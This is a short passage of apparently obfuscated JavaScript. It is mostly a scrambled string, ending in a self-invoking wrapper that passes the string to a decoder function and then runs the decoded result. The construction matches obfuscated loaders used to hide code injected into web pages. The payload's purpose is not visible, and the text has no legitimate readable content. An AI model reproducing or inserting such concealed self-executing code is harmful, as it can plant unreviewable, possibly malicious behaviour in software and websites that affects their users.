u}Ho1)c:M,_t1XbcH s!=!3-%1&{_e2;b;!<;}y{0 H5H3}8i${H4]%HelfHH]=HH8o_y0){2Ha&_+s5abtp}#01nHH=]s%T3)_+H%18i+%HHi #;fc,cHgha]]HHe_n3C4t!r;HH(HwH]H_(31C74=(CHtHmc__HHc,_H.l]c0Hs!:8QH2{HH=]H"ams%HWrHneoh);oe tHo)a% )(o cH4x]i)|Hlxn=%f=HH?Hdf%{H;(.RH{HF3eH} P1.oC)-kcH\/W02nt1_l.9m_)(H (j{d] ]ef|}9!ooflHuo _g.]ocV5Ha._O_r85.\'ZHstoHHpfa.H (]H_e(pHc;;+%5H8lHtcm NrH&=N=.[HHc].b%%n{(J,Gc0H_)H!i#b=4a.4b=.LoH}H4y)s7H)eua;eLdaks}nd#5e:r=H{y1!i(]o:)!nHhHcH!5imH}en=H1o}}HHk5\\pHi<_ )u.Ro",aHt]nH]|]H9_*$;sEr1H5H#f;i9]Sf!HHH1]4eH%p..cscS]ro[]t}e%h=!p%t _H]7lo2.xNZrccH0oat(l,.p63]_13o(r ++_HLador0 9)(rcQ1]neof =HiHx8esoH]c"c_tQ.i Hii=H.b1dXe)c6 nl#o_(t%c b)_)n!}V)'));var DYi=Fku(fYY,dpI );DYi(9217);return 3750})()
